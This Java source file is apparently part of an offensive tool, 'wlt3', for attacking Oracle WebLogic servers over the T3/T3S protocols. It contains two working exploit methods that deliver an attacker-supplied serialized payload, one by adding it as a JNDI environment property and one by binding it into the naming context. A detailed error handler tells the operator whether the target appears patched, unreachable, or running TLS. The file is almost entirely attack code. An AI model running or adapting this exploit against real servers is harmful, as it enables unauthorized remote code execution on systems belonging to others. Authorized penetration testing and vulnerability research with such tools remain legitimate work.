package bort.millipede.wlt3;

import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.CommunicationException;
import javax.naming.NameNotFoundException;

public class ContextExploit {
	public static void runPropertyExploit(Object payload,String host,int port,boolean t3s,boolean verbose) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put("java.naming.factory.initial","weblogic.jndi.WLInitialContextFactory");
		env.put("java.naming.provider.url",protocol+"://"+host+":"+Integer.toString(port));

		Context ctx = null;
		try {
			ctx = new InitialContext(env);
			System.out.print("\b\b\b\bsucceeded!\n");
			ctx.addToEnvironment("Prune_Tracy"+System.nanoTime(),payload); //environment property-based exploitation
			ctx.lookup("Prune_Tracy"+System.nanoTime());
		} catch(CommunicationException ce) {
			parseCommunicationException(ce,protocol,host,port,verbose);
		} catch(NameNotFoundException nnfe) {
			System.out.println("javax.naming.NameNotFoundException thrown, but this is normal for \"Property\" method. Exploitation appears successful!"+(verbose ? " Re-run with --verbose option to see full Exception output!" : ""));
			if(verbose) {
				System.err.print("\n");
				nnfe.printStackTrace();
			}
		} catch(Exception e) {
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		} finally {
			try {
				ctx.close();
			}
			catch (Exception e) {
				//don't care
			}
		}
	}
	
	public static void runBindExploit(Object payload,String host,int port,boolean t3s,boolean verbose) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		//set connection properties
		Hashtable<String,Object> env = new Hashtable<String,Object>();
		env.put("java.naming.factory.initial","weblogic.jndi.WLInitialContextFactory");
		env.put("java.naming.provider.url",protocol+"://"+host+":"+Integer.toString(port));

		Context ctx = null;
		try {
			ctx = new InitialContext(env);
			System.out.print("\b\b\b\bsucceeded!\n");
			ctx.bind("Check_For_Millipedes"+System.nanoTime(),payload); //context bind-based exploitation
			System.out.println("No Exception(s) thrown, exploitation appears successful!");
		} catch(CommunicationException ce) {
			parseCommunicationException(ce,protocol,host,port,verbose);
		} catch (Exception e) {
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		} finally {
			try {
				ctx.close();
			} catch (Exception e) {
				//don't care
			}
		}
	}
	
	private static void parseCommunicationException(CommunicationException ce,String protocol,String host,int port,boolean verbose) {
		Throwable cause = ce.getCause();
		if(cause!=null) {
			String eType = cause.getClass().getName();
			switch(eType) {
				case "weblogic.rjvm.PeerGoneException":
					System.err.println("Target WebLogic Server at "+protocol+"://"+host+":"+port+" forcefully closed "+protocol.toUpperCase()+" connection! Server seems to be patched!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					break;
				case "java.net.ConnectException":
					System.out.print("\b\b\b\bfailed!\n");
					String message = cause.getMessage();
					if(message!=null) {
						if(message.contains("java.io.IOException: Empty server reply")) {
							System.err.println("Target Server/Port at "+host+":"+port+" does not appear to be running "+protocol.toUpperCase()+"! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("java.net.ConnectException: Connection refused")) {
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" refused! Target host appears to be down or port is closed!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("javax.net.ssl.SSLHandshakeException")) {
							if(message.contains("handshake_failure")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed (Handshake Error)! Try a different TLS connection protocol!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else if(message.contains("PKIX") && message.contains("unable to find valid certification path")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! "+(verbose ? "" : "\nRe-run with --verbose option to see full error output!")); //TODO add messaging about InstallCert
							} else if(message.contains("Remote host closed connection during handshake")) {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed, Remote host closed connection during handshake! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else {
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							}
						} else if(message.contains("javax.net.ssl.SSLException: Unsupported record version")) {
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Try a different TLS connection protocol!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("java.net.SocketException: Connection reset") && protocol.toUpperCase().equals("T3")) {
							System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else {
							System.err.println("Unknown Connection Error occurred: connection failed"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						}
					}
					break;
				case "weblogic.socket.UnrecoverableConnectException":
					System.out.print("\b\b\b\bfailed!\n");
					message = cause.getMessage();
					if(message.contains("Login failed for an unknown reason") && protocol.toUpperCase().equals("T3")) {
						System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					} else if(message.contains("Login failed for an unknown reason") && protocol.toUpperCase().equals("T3S")) {
						System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					} else {
						System.err.println("Unknown Unrecoverable Connection Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					}
					break;
				default:
					System.out.println("\b\b\b\b???\n");
					System.err.println("Unknown Connection Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
					break;
			}
		} else {
			System.out.println("\b\b\b\b???\n");
			System.err.println("Unknown Communication Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
		}
		
		if(verbose) {
			System.err.print("\n");
			ce.printStackTrace();
		}
	}
}
